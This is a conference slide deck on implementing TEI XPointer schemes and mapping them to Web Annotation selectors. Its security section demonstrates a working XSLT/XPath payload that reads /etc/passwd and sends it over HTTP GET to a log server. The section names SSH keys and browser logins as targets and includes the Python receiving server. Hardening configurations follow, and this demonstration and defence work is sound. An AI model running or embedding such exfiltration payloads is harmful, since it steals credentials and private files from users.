---
author: Christian Lück, Ludger Hiepel, Johannes Schnocks
title: TEI XPointer Schemes – Implementation and Example Application
---

# TEI XPointer Schemes


## Table of Contents

::: incremental

1. TEI XPointers Schemes

1. XPointers + `<annotation>` = Web Annotations

1. Usage Example

1. Security

:::

# TEI XPointer Schemes

## XPointers { .align-top .xxsmall }

::: incremental

- point to a portion of a document
- not just `#idref`
- describe the *portion* with XPath
- `#xpath(/TEI[1]/text[1]//p[position() gt 42])`
- point to a *point* inside the document
- `#left(/TEI[1]/text[1]//p[4])`
- describe the *point* with XPath and string offset
- `#string-index(/TEI[1]/text[1]//p[4],23)`
- point to a *range* between to points
- `#range(left(/TEI[1]/text[1]//p[4]),right(/TEI[1]/text[1]//p[10]))`
- `#string-range(/TEI[1]/text[1]//p[4],42,23)`

:::

## XPointer Schemes from SATS { .align-top .xxsmall }

::: { .xsmall .text-left }

1. `#xpath( XPATH )` ✓ 
1. `#left( IDREF | XPATH )` ✓
1. `#right( IDREF | XPATH )` ✓
1. `#string-index( IDREF | XPATH, OFFSET )` ✓
1. `#range( POINTER, POINTER [, POINTER, POINTER ]* )` ✓
1. `#string-range( IDREF | XPATH, OFFSET, LENGTH [, IDREF | XPATH, OFFSET, LENGTH ]* )` ✓
1. `#match( IDREF | XPATH, 'REGEX' [, INDEX ] )` x

Equivalents in W3C XPointer schemes. But TEI XPointers (may?) differ in default namespace.

`#xmlns(tei=http://www.tei-c.org/ns/1.0)xpath(...)` x

Namespace scheme, part of the XPointer core standard.

:::

## XPointers are dead { .align-top .xsmall }

::: incremental

- and always were
- Reasons?
- poor design?
- security issues?
- unclear what to do with them (They are just pointing!)
- lack of implementations!
- ...

:::

## Implementation { .align-top .xxsmall}

::: incremental

- syntax: XPath expressions may contain balanced parenthesis, and
  commas, that also delimit pointer 'arguments'
- the syntax is not a regular language, but a CFG (cf. Chomsky)
- parser needed
- implementation comes in modules
  - parser for XPointer grammar (ANTLR)
  - API of XPath functions for doing something with XPointers
  - implementation of the XPointer processor based on Saxon

:::

## API { .align-top .xxsmall}

::: incremental

::: { .text-left }

XPointers just point. However, you may want to dereference a pointer and get 

- a node
- a sequence of nodes
- a sequence of strings
- a sequence of mixed items or XDM values

Let's have an API!

:::
:::

## Let's have an API!

::: incremental

1. `xptr:get-sequence(doc as document(), xpointer as xs:string) as node()*` ✓
   - returns empty sequence for points, but a sequence for `#range(...)` etc.
1. `xptr:is-sequence(xpointer as xs:string) as xs:boolean`
   - returns `true()` for sequence types
1. `xptr:is-point(xpointer as xs:string) as xs:boolean`
   - returns `true()` for point types
1. ...

:::

# `<tei:annotation>` 🎔 XPointers

## &lt;tei:annotation> { .align-top .xxsmall }


::: { .text-left }

Is such a nice element!

:::

. . .

::: { .text-left }

> `<annotation>` represents an annotation following the Web Annotation Data Model. [TEI Reference, v4.6.0]

:::

. . .

::: { .text-left }

... but lacks a friend!

There is nobody around in TEI who can represent **selectors** like the
selectors in the Web Annotation Data Model.

:::

. . .

Except the guys from SATS!


## XPointers translate to Selectors { .align-top .xxsmall }

::: {.columns style="margin-top: 1em"}
:::: {.column width="50%" .xxsmall }

```{xml}
<listAnnotation>
   <annotation ptr="">
	  <!-- annotation body -->
	  <note>
		 Some comment.
	  </note>
   </annotation>
   ...
</listAnnotation>
```

::::
:::: {.column width="50%" .xxsmall }

```{ttl}
[] a triple .

```

::::
:::



# Security


## Crafting XPath for Stealing Secrets { .align-top }

::: incremental
::: {.xxsmall}

- /etc/passwd
- /etc/shadow
- ~/.ssh/id_rsa
- ~/.mozilla/firefox/PROFILE/logins.json

- Steal it! But do not include it in the output!
- `read => encode => send over http`
- Chatter! There are no POST requests from XPath!
- Use GET and encode secrets in query parameters

:::
:::

## Send Secrets to a Log Server { .align-top }

```
http://mylogserver.com/log?plain=SECRET&base64=c2VjcmV0Cg==
```

Logs on the Server

```
b'secret\n'
SECRET
127.0.0.1 - - [04/Sep/2023 18:55:36] "GET /log?plain=SECRET&base64=c2VjcmV0Cg== HTTP/1.1" 200 -
```

## Log-Server { .align-top }

::: {.xxsmall}
::: {.xxsmall}
```{python}
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse
import base64

class LogHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        params = parse_qs(urlparse(self.path).query)
        for p in params.get("base64", []):
            print(base64.b64decode(p))
        for p in params.get("plain", []):
            print(p)
        self.send_response(200)
        self.send_header("Content-Type", "application/xml")
        self.end_headers()
        self.wfile.write(str.encode("<b>true</b>", "UTF-8")) # return true

if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", 8000), LogHandler)
    server.serve_forever()
```
:::
:::

## XPath for Stealing Secrets { .align-top }

::: {.xxsmall}

```
read => encode => send
```

Identity Transformation, but steals `/etc/passwd`:

::: {.xxsmall}

```{xsl}
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:xs="http://www.w3.org/2001/XMLSchema" exclude-result-prefixes="#all" version="3.0">
    <xsl:mode on-no-match="shallow-copy"/>
    <xsl:template match="/*">
        <xsl:if test="
                let $file := '/etc/passwd',
                    $logserver := 'http://localhost:8000/log?plain=',
                    $encoding := map {
                        'encoding': 'utf8',
                        'method': 'html',
                        'escape-uri-attributes': true()
                    },
                    $read := unparsed-text($file),
                    $encoded := replace($read, '\s+', '_') => serialize($encoding),
                    $sent := doc(concat($logserver, $encoded))
                return
                    xs:boolean($sent/*:b/text())">
            <xsl:apply-templates/>
        </xsl:if>
    </xsl:template>
</xsl:stylesheet>
```
:::
:::

## Security Risk of XPointers

::: incremental
::: {.xxsmall}
- The XPointer Processor has to evaluate XPath expressions.
- These expressions may contain malicious code.
- Not only an issue of XPointers, but, as seen, of **any
  X-Technology** that is able to evaluate XPath expressions or
  requires XPath evaluation: XSLT, XQuery, `<tei:cRefPattern>`,
  `<tei:citeStructure>`, Selectors in Web Annotations, ...

:::

=> We have to harden our runtime against such attacks.

:::

## Hardening XPointer Processors { .align-top .xxsmall }


1. On Server: Do not allow access to local file system
1. On Desktop: Do not allow access to outside world

Use a Saxon config file like this:

```
java -cp saxon.jar:other.jar net.sf.saxon.Trans -config:saxon.xml ...
```

```{xml}
<configuration xmlns="http://saxon.sf.net/ns/configuration"
               edition="HE"
               label="Hardened configuration for Desktop">
  <global
    allowedProtocols="file"
    />
</configuration>
```

## Hardening using custom URI Resolvers { .align-top .xxsmall }

::: { .xsmall }

Saxon uses URI resolvers for processing all kinds of requests. You can
use hardened URI resolvers that allow access to specific paths of your
file system only. Trying to access other paths will cause an
exception.

:::

::: { .xsmall }
```
<configuration xmlns="http://saxon.sf.net/ns/configuration"
               edition="HE"
               label="Hardened configuration">
  <global
    allowedProtocols="all"
    unparsedTextURIResolver="de.wwu.scdh.saxon.harden.HardenedUnparsedTextResolver"
    uriResolver="de.wwu.scdh.saxon.harden.HardenedURIResolver"
    />
</configuration>
```
:::

```
java -DallowedPath=/home/me/projects -cp saxon.jar:harden.jar:other.jar \
	net.sf.saxon.Trans -config:saxon.xml ...
```


# Thanks!
